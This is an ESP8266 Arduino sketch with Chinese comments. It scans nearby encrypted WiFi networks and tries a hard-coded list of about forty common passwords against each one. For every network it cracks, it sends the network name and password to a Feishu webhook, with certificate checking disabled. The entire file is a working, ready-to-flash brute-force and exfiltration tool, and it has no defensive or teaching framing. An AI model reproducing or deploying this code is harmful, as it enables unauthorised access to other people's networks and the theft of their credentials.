#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>
#include <WiFiClientSecure.h>

// === 配置区 ===
const char* webhook_url = "https://open.feishu.cn/open-apis/bot/v2/hook/YOUR_HOOK_HERE"; // ⚠️ 替换为你的有效 hook

const char* passwords[] = {
  "12345678",
  "123123123",
  "1234567890",
  "123456789",
  "password",
  "admin123",
  "11111111",
  "22222222",
  "33333333",
  "44444444",
  "55555555",
  "66666666",
  "77777777",
  "88888888",
  "99999999",
  "00000000",
  "0987654321",
  "123456123456",
  "1234567890.",
  "abc123123",
  "iloveyou",
  "87654321",
  "lililili",
  "qwertyuiop",
  "asdfghjkl",
  "zxcvbnm123",
  "1q2w3e4r5t",
  "1qaz2wsx3edc",
  "1qaz2wsx",
  "147258369",
  "159357258",
  "258369147",
  "qazwsxedc",
  "qwerty123",
  "66668888",
  "88886666",
  "1234abcd",
  "abcd1234",
  "11223344",
  "111111111",
  "11111111",
  "87654321",
};

const int password_count = sizeof(passwords) / sizeof(passwords[0]);

const int LED_PIN = 2; // 板载 LED（低电平点亮）

// === 函数声明 ===
void sendToFeishu(const String& ssid, const String& password);
void blinkLED(int times, int delay_ms);

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH); // 初始熄灭

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(1000);

  Serial.println("开始扫描 WiFi...");
  digitalWrite(LED_PIN, LOW);
  int n = WiFi.scanNetworks();
  digitalWrite(LED_PIN, HIGH);
  Serial.printf("发现 %d 个网络\n", n);

  int successCount = 0;

  // 遍历所有扫描到的网络
  for (int i = 0; i < n; i++) {
    String ssid = WiFi.SSID(i);
    uint8_t encType = WiFi.encryptionType(i);

    // 跳过开放网络
    if (encType == ENC_TYPE_NONE) {
      Serial.printf("跳过开放网络: %s\n", ssid.c_str());
      continue;
    }

    Serial.printf("\n【%d/%d】尝试连接: %s\n", i + 1, n, ssid.c_str());

    bool cracked = false;
    for (int j = 0; j < password_count; j++) {
      digitalWrite(LED_PIN, LOW); // 尝试时点亮

      WiFi.disconnect();
      delay(100);
      WiFi.begin(ssid.c_str(), passwords[j]);

      int attempts = 0;
      while (WiFi.status() != WL_CONNECTED && attempts < 20) {
        delay(500);
        attempts++;
      }

      if (WiFi.status() == WL_CONNECTED) {
        Serial.println("✅ 破解成功！");
        blinkLED(4, 150); // 快速闪烁表示成功
        sendToFeishu(ssid, passwords[j]);
        WiFi.disconnect();
        successCount++;
        cracked = true;
        break; // 找到当前 SSID 的密码即可，继续下一个 SSID
      }
    }

    if (!cracked) {
      digitalWrite(LED_PIN, HIGH); // 熄灭表示失败
      Serial.printf("❌ %s：所有密码尝试失败\n", ssid.c_str());
    }

    delay(1000); // 防止过快，给路由器喘息
  }

  // 最终结果汇总
  Serial.printf("\n=== 爆破完成 ===\n共尝试 %d 个加密网络，成功 %d 个。\n", n, successCount);
  
  if (successCount > 0) {
    // 长亮 2 秒表示有成果
    digitalWrite(LED_PIN, LOW);
    delay(2000);
  } else {
    // 慢闪表示全部失败
    blinkLED(3, 600);
  }

  digitalWrite(LED_PIN, HIGH);
  Serial.println("进入深度睡眠...");
  ESP.deepSleep(0);
}

void loop() {}

void sendToFeishu(const String& ssid, const String& password) {
  WiFiClientSecure client;
  client.setInsecure(); // 测试用，忽略证书

  HTTPClient https;
  if (https.begin(client, webhook_url)) {
    https.addHeader("Content-Type", "application/json; charset=utf-8");
    String json = "{\"msg_type\":\"text\",\"content\":{\"text\":\"[WiFi爆破成功]\\nSSID: ";
    json += ssid;
    json += "\\nPassword: ";
    json += password;
    json += "\"}}";

    int code = https.POST(json);
    Serial.printf("飞书通知返回码: %d\n", code);
    https.end();
  }
}

void blinkLED(int times, int delay_ms) {
  for (int i = 0; i < times; i++) {
    digitalWrite(LED_PIN, LOW);
    delay(delay_ms);
    digitalWrite(LED_PIN, HIGH);
    if (i < times - 1) delay(delay_ms);
  }
}